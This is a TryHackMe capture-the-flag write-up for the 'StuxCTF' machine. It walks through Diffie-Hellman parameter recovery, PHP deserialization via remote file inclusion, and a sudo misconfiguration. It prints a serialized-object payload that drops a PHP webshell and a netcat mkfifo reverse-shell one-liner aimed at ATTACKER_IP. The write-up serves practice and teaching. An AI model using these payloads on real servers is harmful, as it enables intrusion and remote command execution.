@@ -1,0 +1,449 @@
+---
+title: "StuxCTF - TryHackMe"
+date: 2025-03-02
+categories: [TryHackMe]
+tags: [web, linux, enumeration, ssrf, ssti, rabbitmq, medium]
+---
+
+
+Crypto, serealization, priv scalation and more ...!
+
+This machine is part of **TryHackMe** and is rated as a **medium**-level Linux challenge. It provides an excellent opportunity to practice skills in **web enumeration, cryptographic exploits, and privilege escalation**. Throughout the challenge, we will explore a vulnerable web application, exploit misconfigurations, and ultimately gain root access. Let's dive into the journey and uncover the secrets hidden within this machine!
+
+--- 
+### Recon
+
+To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :
+
+```
+nmap 10.10.53.93 -sV -sC -p- -oN nmapres
+```
+
+![[Capture d'écran 2025-03-16 111130.png]]
+
+The scan reveals two open ports :
+
+-  `22/tcp` : using `ssh` service
+-  80/tcp : using `http` service
+
+Next, we can perform a directory enumeration using `gobuster`.
+
+![[Capture d'écran 2025-03-16 111854.png]]
+
+The scan reveals that we can only access `http://stux.thm:80`.
+
+We can continue enumerating with a `dirsearch` scan.
+
+![[Capture d'écran 2025-03-16 113735.png]]
+
+The scan reveals a `robots.txt` file.
+
+Let's check the web page at `http://stux.thm:80`.
+
+![[Capture d'écran 2025-03-16 114327.png]]
+
+It seems that we cannot find any relevant information on the page itself. However, if we check the **View Page Source**, we can uncover some interesting details.
+
+![[Capture d'écran 2025-03-16 115035.png]]
+This reveals the following strings  : 
+
+- p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
+- g: 7;
+- a: 330;
+- b: 450;
+- g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
+
+These appear to be cryptographic parameters that, if processed correctly, could reveal a secret directory.
+
+Upon checking the `http://stux.thm:80/robots.txt` file that we found earlier, we see that the file hints at the cryptographic algorithm we should use:
+
+![[Capture d'écran 2025-03-16 120116.png]]
+
+Thus, we can assume that **Diffie-Hellman** is the algorithm we need to use in order to find the secret key, which will lead us to the secret directory.
+
+---
+### Diffie-Hellman  algorithm 
+
+In this part of the challenge, we need to derive the secret shared key using the **Diffie-Hellman** key exchange algorithm. Diffie-Hellman allows two parties (Alice and Bob) to securely exchange a shared key over an insecure communication channel. However, in this case, the challenge involves a third party (Charlie) as well. We need to compute the shared secret using the information provided, which includes **Alice's private key (a)**, **Bob's private key (b)** and **Charlie’s public key (g^c mod p)**.
+
+---
+### Diffie-Hellman process with three parties
+
+In this case, we have **Charlie’s public value (`g^c mod p`)**, which is already provided as a pre-computed public key. Charlie is not participating directly in the key exchange, but his public value is involved in deriving the shared secret.
+
+With **Charlie**’s public value included, we need to combine the values from **Alice’s private key `a`**, **Bob’s private key `b`**, and **Charlie’s public key `g^c mod p`** to compute the shared secret.
+
+Here’s the process broken down :
+
+1. **Step 1**: Alice uses Charlie's public key **`g^c mod p`** and raises it to the power of her private key `a`. This operation is equivalent to computing **`g^(ac) mod p`**, which Alice performs as:  
+    `key = (g^c)^a mod p`.
+    
+2. **Step 2**: Bob then takes the result from Alice (which is `g^(ac) mod p`) and raises it to the power of his private key `b`. This operation gives us the final shared secret:  
+    `key = (g^(ac))^b mod p = g^(abc) mod p`.
+    
+
+At the end of these steps, both **Alice** and **Bob** will compute the same shared secret `g^(abc) mod p`, which can then be used to decrypt messages or access secret data (such as a hidden directory).
+
+````python
+def power(a, b, p):
+    # Compute (a^b) mod p
+    if b == 1:
+        return a % p
+    return pow(a, b, p)
+
+def main():
+    # Alice's private key
+    a = 330
+
+    # Bob's private key
+    b = 450
+
+    # Charlie's public key (g^c mod p)
+    charlie_key = 609191[...]454617
+
+    # Public parameters (p and g)
+    p = 997529[...]591251
+    g = 7
+
+    # Step 1: Compute (g^c)^a mod p (Alice's calculation)
+    key = power(charlie_key, a, p)  # (g^c)^a mod p
+
+    # Step 2: Compute (g^(ac))^b mod p (Bob's calculation)
+    key = power(key, b, p)  # g^(ca)^b mod p = g^(cab) mod p
+
+    # Print the secret shared key
+    print("Secret key: ", key)
+
+if __name__ == "__main__":
+    main()
+````
+
+By combining **Alice's private key**, **Bob's private key**, and **Charlie's public key**, we can compute the shared secret key. This key is used to unlock the secret...
+
+```text
+Secret key :  473150[...]976839
+```
+
+--- 
+### Finding the hidden directory 
+
+The challenge gives us a hint which is : "HINT: \[...] first 128 characters ..." 
+
+So we can ajust our code by adding this : 
+
+```python 
+print ("First 128 character : ",str(key)[:128])
+```
+
+And we get this in output : 
+
+```text
+First 128 character : 4731502[...]855055
+```
+
+Now we can access to the **hidden** directory with `http://stux.thm:80/4731502[...]855055`
+
+![[Capture d'écran 2025-03-16 141611.png]]
+
+It worked, and we've successfully discovered the hidden directory!
+
+--- 
+### Recon 2
+
+At this point, we can start enumerating the new information we've gathered. Let's use `ffuf` to search for any **GET** parameters that could be vulnerable to **local file inclusion** (LFI) attacks or to simply identify a file access parameter.
+
+```shell 
+ffuf -u "http://stux.thm/4731502[...]855055/?FUZZ=" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fw 284
+```
+
+```shell 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+[...]
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://stux.thm/4731502[...]855055/?FUZZ=
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 284
+________________________________________________
+
+file                    [Status: 200, Size: 1182, Words: 286, Lines: 32, Duration: 26ms]
+:: Progress: [4734/4734] :: Job [1/1] :: 696 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
+```
+
+The scan reveals that we have found the word `file` as a **GET** parameter.
+
+Additionally, upon checking the **View Page Source** again, we can spot a **hint** :
+
+![[Capture d'écran 2025-03-16 142026.png]]
+
+Based on the `ffuf` output and the hint provided, it seems we may be able to access local files via the URL `http://stux.thm:80/4731502[...]855055/?file=`.
+
+Next, we can use `ffuf` again to enumerate possible files that we can analyze :
+
+```shell
+ffuf -u "http://stux.thm/4731502[...]855055/?file=FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  -fw 286 
+````
+
+```shell
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://stux.thm/4731502[...]855055/?file=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 286
+________________________________________________
+
+assets                  [Status: 200, Size: 1168, Words: 284, Lines: 32, Duration: 26ms]
+index.php               [Status: 200, Size: 6664, Words: 284, Lines: 32, Duration: 40ms]
+:: Progress: [4734/4734] :: Job [1/1] :: 1379 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
+```
+
+We’ve just found an `index.php` file. Let’s check if we can uncover any sensitive information within it.
+
+![[Capture d'écran 2025-03-16 150334.png]]
+
+
+Using `Burp Suite`, we discovered an output that seems to be encrypted. To decrypt it, we'll use [CyberChef](https://gchq.github.io/CyberChef/).
+
+First, we apply the `From Hex` operation, and we get a result that appears to be a `Base64` encoded message, identifiable by the `==` pattern.
+
+![[Capture d'écran 2025-03-16 150645.png]]
+
+Next, we can apply the `reverse` operation followed by `From Base64` to see if we can decrypt the message.
+
+![[Capture d'écran 2025-03-16 151404.png]]
+
+After decrypting the message, we obtain the **`index.php`** source code.  
+
+Upon analyzing it, we find a **vulnerable section**:
+
+```php 
+$file_name = $_GET['file'];<br />
+
+if(isset($file_name) && !file_exists($file_name)){<br />
+
+echo "File no Exist!";<br />
+
+}<br />
+
+<br />
+
+if($file_name=="index.php"){<br />
+
+$content = file_get_contents($file_name);<br />
+
+$tags = array("", "");<br />
+
+echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
+
+}<br />
+
+unserialize(file_get_contents($file_name));<br />
+[...]
+```
+
+We identify a major **PHP Object Injection** vulnerability due to this line : 
+
+```php
+unserialize(file_get_contents($file_name));
+```
+
+- The script **retrieves** the content of a file (given in the `file` parameter).
+- Then, it **unserializes** its content, which can be extremely dangerous if we control the file.
+
+This means we can craft a **malicious serialized PHP object** that will be interpreted by `unserialize()`.  
+In this case, we see that there is a **`file` class** in the code :
+
+```php
+class file {
+    public $file = "dump.txt";
+    public $data = "dump test";
+
+    function __destruct(){
+        file_put_contents($this->file, $this->data);
+    }
+}
+```
+
+This class has a **destructor** (`__destruct()`), which automatically writes **`$data` into `$file`** when the object is destroyed.  
+This means that if we **control the serialized object**, we can **create a file with arbitrary content on the server**.
+
+So let's try to exploit this vulnerability with the following code : 
+
+```php
+<?php 
+class file{
+	public $file = "test.php";
+	public $data = "<?php echo 'Is it vulnerable ?' ?>";
+}
+print(serialize(new file));
+?>
+```
+
+Then let's execute the code :
+
+![[Capture d'écran 2025-03-16 154612.png]]
+
+And we obtain a new serialized object for the exploit. Now, let's test if it works.
+
+To do this, we first need to make a request to retrieve the contents of the `output.txt` file on our local machine. We can use a simple Python HTTP server to serve the serialized payload :
+
+```bash 
+python3 -m http.server 4321
+```
+
+Then, we make a request from the target server to fetch our malicious object :
+
+```bash
+http://stux.thm/4731502[...]855055/?file=http://YOUR_IP:4321/output.txt
+```
+
+
+![[Capture d'écran 2025-03-16 154834.png]]
+
+![[Capture d'écran 2025-03-16 154916.png]]
+
+If the exploit works as expected, the server will **deserialize our injected object**, triggering the `__destruct()` function and writing our payload to a new file on the target machine. We can navigate to `test.php` to see if the exploit worked : 
+
+![[Capture d'écran 2025-03-16 155004.png]]
+
+And it worked ! 
+
+---
+### Initial foothold
+
+Now that we have identified the **unserialization vulnerability**, we can exploit it to gain a foothold on the target machine.
+
+Our plan is to create a **malicious PHP object** that, when deserialized, writes a **webshell** to the server. This will allow us to execute commands remotely.
+
+To do this, we craft the following PHP script :
+
+```php
+<?php 
+class file {
+	public $file = "exploit.php";
+	public $data = '<?php system($_GET["c"])?>'; 
+}
+print(serialize(new file));
+?>
+```
+
+![[Capture d'écran 2025-03-16 160229.png]]
+
+Now, we **repeat our previous steps** to inject the serialized payload into the target server.
+
+After making the request to unserialize the payload, our `exploit.php` file should be created on the server.
+
+![[Capture d'écran 2025-03-16 160351.png]]
+
+![[Capture d'écran 2025-03-16 160407.png]]
+
+Once the webshell is in place, we can test it by visiting :
+
+```bash
+http://stux.thm/4731502[...]855055/exploit.php?c=whoami
+```
+
+If the exploit works, we should see the **current user** of the target machine displayed in the response :
+![[Capture d'écran 2025-03-16 160533.png]]
+
+It's worked, so now with command execution confirmed, we can upgrade our access to a **fully interactive reverse shell**.
+
+We use the following **Netcat reverse shell payload** :
+
+```sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
+```
+
+Since this needs to be **URL-encoded**, it would look like this :
+
+```sh
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<ATTACKER_IP>%20<ATTACKER_PORT>%20%3E%2Ftmp%2Ff
+```
+
+![[Capture d'écran 2025-03-16 161309.png]]
+
+We start a **Netcat listener** on our attack machine :
+
+```bash 
+nc -lvnp <ATTACKER_PORT>
+```
+
+Then, we trigger the shell by accessing :
+
+```bash
+http://stux.thm/4731502[...]855055/exploit.php?c=<URL_ENCODED_PAYLOAD>
+```
+
+And we successfully establish a connection to the target machine.
+
+![[Capture d'écran 2025-03-16 161329.png]]
+
+--- 
+### User flag 
+
+Now that we have access, our next step is to retrieve the user flag.
+
+![[Capture d'écran 2025-03-16 161650.png]]
+
+--- 
+### Recon 3 
+
+Now, let's enumerate the system to better understand the environment and identify any vulnerabilities or misconfigurations that could lead us to the **root** flag.
+
+![[Capture d'écran 2025-03-16 162133.png]]
+
+The output of the `sudo -l` command reveals that the `www-data` user has permission to execute any command as root **without requiring a password**. A critical misconfiguration that we can exploit...
+
+--- 
+### Privilege escalation 
+
+With root access obtained, we can now retrieve the **root flag** :
+
+![[Capture d'écran 2025-03-16 162543.png]]
+
+--- 
+### Root flag 
+
+Finally, we can now read the **root flag** :
+
+![[Capture d'écran 2025-03-16 162701.png]]
+
+--- 
+
+**Congratulations!** I hope you found this write-up insightful. This CTF was a great challenge that highlighted the importance of carefully analyzing cryptographic implementations, recognizing vulnerabilities in PHP deserialization, and leveraging misconfigurations for privilege escalation. From breaking Diffie-Hellman to gaining root access, this challenge demonstrated how a structured approach and persistence are key in penetration testing.
+
+Thanks for reading, and happy hacking!
+
+![[Capture d'écran 2025-03-16 162955.png]]
+
